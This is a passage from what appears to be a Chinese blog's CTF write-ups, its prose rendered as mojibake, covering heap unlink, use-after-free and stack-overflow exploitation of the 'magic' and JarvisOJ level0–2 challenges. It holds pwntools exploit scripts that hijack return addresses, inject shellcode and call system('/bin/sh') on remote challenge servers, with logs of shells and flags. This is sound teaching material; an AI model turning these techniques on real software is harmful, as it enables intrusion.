listä¸­ï¼Œæ‰§è¡Œåï¼ŒæŒ‡é’ˆå˜ä¸ºP_ptr - 8</li><li>BK-&gt;fd = FDï¼Œè¿™é‡ŒBK-&gt;fdä¾ç„¶æ˜¯chunk2ï¼Œæ‰§è¡Œåï¼ŒæŒ‡é’ˆå˜ä¸ºP_ptr - 12<br>å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œçš„ç¬¬ä¸€æ­¥ç»“æœè¢«ç¬¬äºŒéƒ¨çš„ç»“æœè¦†ç›–æ‰ï¼Œunlinkåçš„å®é™…ç»“æœï¼Œä»…ç›¸å½“äºæ‰§è¡Œäº†ç¬¬äºŒæ­¥<br>æœ€ç»ˆbin listä¸­æŒ‡å‘chunk2çš„æŒ‡é’ˆæŒ‡å‘äº†chunk2 - 12çš„åœ°å€å¤„ï¼Œè¿™ä¸ªæŒ‡é’ˆä¸€èˆ¬å­˜åœ¨äºBSSæ®µï¼Œ<br>å› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹æŒ‡é’ˆå¯¹ä»»æ„åœ°å€è¯»å†™ã€‚</li></ol><ul><li>UAF</li></ul><p>UAFï¼Œå³freeåä½¿ç”¨ï¼Œfreeåæœªå°†æŒ‡é’ˆç½®ä¸ºNULLï¼Œé€ æˆæ‚¬ç©ºï¼ˆä¹Ÿå°±æ˜¯é‡æŒ‡é’ˆï¼‰ï¼Œä¹‹åæƒ³åŠæ³•å°†è¿™å—å†…å­˜å†æ¬¡è·å–å›æ¥ï¼Œå†™å…¥å€¼ï¼Œæ­¤æ—¶çš„æ–°æŒ‡é’ˆå’Œé‡æŒ‡é’ˆåŒæ—¶æŒ‡å‘è¿™å—å†…å­˜ï¼Œä¹Ÿå°±å¯ä»¥åˆ©ç”¨é‡æŒ‡é’ˆæ¥æ“ä½œè¿™å—å†…å­˜çš„æ•°æ®ï¼Œé€ æˆä»»æ„è¯»å†™ã€‚<br>ä¸¾ä¸ªæ —å­ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stu_id</span><br><span class="line">    <span class="keyword">char</span>* stu_name;</span><br><span class="line">    <span class="keyword">int</span> *()(<span class="keyword">void</span>);</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p><p>å‡è®¾æœ‰ç¬¦åˆä¸Šè¿°ç»“æ„ä½“çš„å…ƒç´ stu0ï¼Œç¨‹åºæ­¤æ—¶è¦freeæ‰stu0ï¼Œä½†æ˜¯å¿˜è®°å°†stu0çš„æŒ‡é’ˆç½®ç©ºï¼Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªstu0çš„æŒ‡é’ˆäº†ã€‚æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å†æ¬¡ä½¿ç”¨stu0è¿™å—å†…å­˜ï¼Œæœ€ç®€å•çš„åŠæ³•å°±æ˜¯å†é€šè¿‡ç¨‹åºç”³è¯·ä¸€ä¸ªåŒæ ·å¤§å°çš„å—ï¼Œæ­¤æ—¶å †ç®¡ç†å™¨ä¼šæŒ‰ç…§ç®¡ç†æœºåˆ¶å°†åˆšåˆšé‡Šæ”¾æ‰çš„stu0å†åº¦åˆ©ç”¨ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°ç¬¬äºŒä¸ªæŒ‡å‘stu0çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬æ§åˆ¶è¿™ä¸ªæ–°æŒ‡é’ˆæ­£å¸¸å¯¹stu_idå’Œstu_nameè¿›è¡Œèµ‹å€¼ï¼Œå‡è®¾stu_nameå€¼ä¸ºAAAA(0x41414141)ï¼Œæ‰“å°é‡æŒ‡é’ˆçš„stu_nameï¼Œå°±ä¼šå°†stu_nameçš„å€¼è§£å¼•ç”¨æ‰“å°å‡º0x41414141åœ°å€å¤„çš„å€¼ï¼ŒåŒç†å¦‚æœæ˜¯é€šè¿‡é‡æŒ‡é’ˆè°ƒç”¨ç»“æ„ä½“å†…éƒ¨å‡½æ•°ï¼Œä¼šå°†è¯¥åœ°å€è§£å¼•ç”¨åŠ«æŒæ§åˆ¶æµåˆ°ä»»æ„åœ°å€ã€‚</p><h3 id="ä¸‰ã€pwné¢˜"><a href="#ä¸‰ã€pwné¢˜" class="headerlink" title="ä¸‰ã€pwné¢˜"></a>ä¸‰ã€pwné¢˜</h3><h5 id="1-magic"><a href="#1-magic" class="headerlink" title="1.magic"></a>1.<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/1" target="_blank" rel="noopener">magic</a></h5><p><a href="https://bamboofox.cs.nctu.edu.tw/uploads/challenge/attachments/1/magic" target="_blank" rel="noopener">é¢˜ç›®ä¸‹è½½</a></p><p>é¢˜ç›®çº¿ç´¢ç»™å‡ºäº†ä¸¤ä¸ªå…³é”®å‡½æ•°æºç <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">    do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡åœ¨è™šæ‹Ÿæœºä¸‹è¿è¡Œç¨‹åºï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  magic ./magic </span><br><span class="line">Welcome to Magic system!</span><br><span class="line">Give me your name(a-z): aaaa</span><br><span class="line">Your name is aaaa.</span><br><span class="line">Give me something that you want to MAGIC: 1111111111111111</span><br><span class="line">ï¿½'ï¿½ï¿½mï¿½ï¿½:ï¿½Â‡Çµï¿½j#</span><br></pre></td></tr></table></figure><p>IDAåç¼–è¯‘ç»“æœå¦‚ä¸‹ï¼š</p><ul><li><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE v4[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-Fh]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Magic system!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your name(a-z): "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; read(<span class="number">0</span>, &amp;v4[i], <span class="number">1u</span>) &amp;&amp; v4[i] &gt; <span class="number">96</span> &amp;&amp; v4[i] ; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v4[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name is %s.\n"</span>, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me something that you want to MAGIC: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    magic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>never_use</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">never_use</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"sh -i"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>æ ¹æ®ä»£ç å¯ä»¥å¾—å‡ºï¼Œmagicçš„scanf()å¤„å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè€Œç¨‹åºä¸­æœ‰ä¸€ä¸ªå†™å¥½äº†çš„never_use()å¯ä»¥è°ƒç”¨shellï¼Œå› æ­¤æ€è·¯åœ¨äºåˆ©ç”¨æ ˆæº¢å‡ºåŠ«æŒeipåˆ°never_use()å¤„ã€‚<br>ä¸ºäº†å…·ä½“å®ç°ï¼Œéœ€è¦äº‹å…ˆè®°ä¸‹never_use()çš„åœ°å€ã€‚åœ¨IDAä¸­æŸ¥çœ‹ï¼š</p><p><img src="https://i.loli.net/2019/02/18/5c6a8a2a8ab42.png" alt="Please wait while loading image." title="addr"></p><p>è¿™é‡Œåº”è¯¥æ˜¯å‡ºé¢˜äººç•™äº†ä¸ªå‘ï¼Œscanf()åœ¨è¯»å–\x0Dçš„æ—¶å€™ä¼šâ€œåƒæ‰â€å®ƒï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä¿®æ”¹ç›®æ ‡åœ°å€ä¸º0x08048613ï¼Œ<br>    target_addr = 0x08048613<br>æœ‰äº†ç›®æ ‡åœ°å€ï¼Œå†å›å¤´æ¥çœ‹åˆ©ç”¨ã€‚æ ¹æ®IDAä¸­ç»™å‡ºçš„å¤§å°</p><p><img src="https://i.loli.net/2019/02/18/5c6a8eb2c93ba.png" alt="Please wait while loading image." title="stack"></p><p>è§‚å¯Ÿsï¼Œè·ç¦»ebpæ˜¯44hï¼Œå³68ï¼ŒåŠ ä¸Šebpè‡ªèº«çš„4å­—èŠ‚å¤§å°ï¼Œæœ€åå¾—å‡ºpayloadçš„æ ¼å¼åº”è¯¥ä¸ºâ€[72]+target_addrâ€ï¼Œè€Œè¿™é‡Œå‡ºé¢˜äººè¿˜ç•™äº†ä¸ªå‘ï¼Œå°±æ˜¯do_magic()ï¼Œè¿™ä¸ªå‡½æ•°ä¼šåœ¨magic()è¿”å›ä¹‹å‰ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥ä¸éšæœºæ•°åšå¼‚æˆ–è¿ç®—ï¼Œè¿™æ ·åŸæœ¬è¾“å…¥çš„ç›®æ ‡åœ°å€ä¼šè¢«æ‰“ä¹±ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦åœ¨payloadçš„åœ°å€å‰æ’å…¥ä¸€ä¸ª\x00ï¼Œ\x00ä¼šä½¿strlen()è¿”å›ï¼Œå› æ­¤åœ¨72ä¸ªéšæœºå­—ç¬¦ä¸­åªè¦æ’å…¥ä¸€ä¸ª\x00ï¼Œåé¢çš„éƒ¨åˆ†å°±ä¸ä¼šè¢«do_magic()æ”¹å˜ï¼Œç›®æ ‡åœ°å€ä¹Ÿå°±ä¿å­˜ä¸‹æ¥äº†ï¼Œæœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="number">0x08048613</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">71</span> + <span class="string">'\x00'</span> + p32(target_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'The payload is :'</span> + payload</span><br><span class="line"><span class="comment">#sh = process('./magic')</span></span><br><span class="line">sh = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><code>`</code></p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-pwn-0~4é¢˜è§£</title>
      <link href="/2019/04/22/JarvisOJ-pwn-0-4/"/>
      <url>/2019/04/22/JarvisOJ-pwn-0-4/</url>
      
        <content type="html"><![CDATA[<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote><p>è¿™é¢˜æ³¨æ„æ˜¯x64çš„ï¼Œå¼€å§‹åšçš„æ—¶å€™æŠŠrbpå½“0x4hè®¡ç®—äº†â€¦è„‘æŠ½äº†</p></blockquote><p><code>main</code>å‡½æ•°åç¼–è¯‘ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>vulnerable_function</code>å‡½æ•°åç¼–è¯‘ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œbufè·ç¦» <code>rbp</code> <code>80h</code>ï¼Œè€Œ<code>read</code>æœ€å¤šå¯ä»¥è¯»<code>200h</code>ã€‚<br>åŒæ—¶åœ¨ç¨‹åºä¸­è¿˜å¯ä»¥å‘ç°è¿™ä¸ªï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">âš¡ root@ubuntu î‚° /mnt/hgfs/ctf/pwn/jarvis  objdump -T level0</span><br><span class="line"></span><br><span class="line">level0:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 write</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 system</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 <span class="built_in">read</span></span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 __libc_start_main</span><br><span class="line">0000000000000000  w   D  *UND*0000000000000000              __gmon_start__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> âš¡ root@ubuntu î‚° /mnt/hgfs/ctf/pwn/jarvis  objdump -t level0 | grep system</span><br><span class="line">0000000000000000       F *UND*0000000000000000              system@@GLIBC_2.2.5</span><br><span class="line">0000000000400596 g     F .text0000000000000010              callsystem</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>0x400596</code>å¤„æœ‰ä¸€ä¸ª<code>callsystem</code>å‡½æ•°ï¼Œå‡½æ•°åç¼–è¯‘å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å› æ­¤æ„é€ æº¢å‡ºå­—ç¬¦ä¸²ï¼Œä½¿å¾—<code>vulnerable_function</code>è¿”å›åœ°å€è¦†ç›–ä¸º<code>callsystem</code>çš„åœ°å€<br>expå¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line">addr = p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + addr</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œæ•ˆæœ:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</span><br><span class="line">\x96\x05@\x00\x00\x00\x00\x00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><code>main</code>å‡½æ•°ä¸level0ä¸€è‡´ï¼Œ<code>vulnerable_function</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç›¸æ¯”level0ï¼Œé¢˜ä¸­æ²¡æœ‰å†ç»™å‡ºä¸€ä¸ªå¯ä»¥ç›´æ¥åˆ©ç”¨çš„<code>system</code>å‡½æ•°ï¼Œå› æ­¤éœ€è¦è‡ªå·±æ„é€ shellcodeï¼Œå¹¶ä¸”åŠ«æŒæ§åˆ¶æµè¿”å›åˆ°shellcodeå¤„ï¼Œ<code>vulnerable_function</code>ä¼šæ‰“å°å‡ºbufçš„åœ°å€ï¼Œä¸”ç¨‹åºæœªå¼€å¯NXä¿æŠ¤ï¼Œå› æ­¤åªéœ€è¦å°†shellcodeå†™å…¥bufå°†<code>vulnerable_function</code>è¿”å›åœ°å€è¦†ç›–ä¸ºbufä¸­shellcodeçš„ä½ç½®ï¼ˆä¸ºäº†æ–¹ä¾¿æ”¾åœ¨bufçš„å¼€å§‹éƒ¨åˆ†ï¼‰å³å¯ï¼Œexpå¦‚ä¸‹ï¼š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((<span class="number">0x88</span>+<span class="number">4</span>),<span class="string">'A'</span>)</span><br><span class="line">a = sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">payload  += p32(int(a,base = <span class="number">16</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œç»“æœï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>vulnerable_function</code>ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å‡½æ•°ä¸­å‡ºç°äº†<code>system</code>å‡½æ•°ï¼Œæ€è·¯ä¸ºæ§åˆ¶<code>read</code>è¿”å›åˆ°<code>system</code>å‡½æ•°ï¼Œå¹¶ä¸”ä¼ªé€ å‚æ•°ï¼Œæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ï¼Œåœ¨ç¨‹åºä¸­å¯ä»¥æ‰¾åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ï¼š<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âš¡ root@ubuntu î‚° /ctf/pwn/jarvis î‚° strings -a -t x ./level2 | grep bin</span><br><span class="line">  1024 /bin/sh</span><br></pre></td></tr></table></figure></p><p>expå¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys) + p32(<span class="number">0xaaaaaaaa</span>) + p32(elf.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œç»“æœï¼š<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><p>ä¸ä¼šå†™expâ€¦â€¦</p></blockquote><p><code>vulunerable_function</code> :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åŒæ ·çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰ç›´æ¥ç»™å‡ºå¯åˆ©ç”¨çš„ä»£ç ï¼Œé¢˜ç›®æä¾›äº†<code>libc-2.19.so</code>ï¼Œå› æ­¤æ€è·¯æ˜¯é¦–å…ˆæ§åˆ¶<code>read</code>è¿”å›åˆ°<code>write</code>ï¼Œæ§åˆ¶<code>write</code>è°ƒç”¨çš„å‚æ•°ï¼Œä½¿å…¶æ‰“å°å‡º<code>read</code>çš„gotåœ°å€å¯¹åº”çš„å€¼ï¼ˆå³<code>read</code>çš„ç»å¯¹åœ°å€ï¼‰ï¼Œå¹¶ä½¿å…¶è¿”å›åˆ°<code>vulnerable_function</code>ï¼Œé€šè¿‡<code>write</code>æ‰“å°å¾—åˆ°çš„<code>read</code>ç»å¯¹åœ°å€ï¼Œåˆ©ç”¨ç»å¯¹åœ°å€å’Œåœ¨libcä¸­æŸ¥è¯¢åˆ°çš„<code>read</code>çš„libcåœ°å€è®¡ç®—å‡ºåç§»ï¼Œä»è€Œè®¡ç®—å‡ºsystemçš„ç»å¯¹åœ°å€ï¼Œç»§è€Œæ„é€ 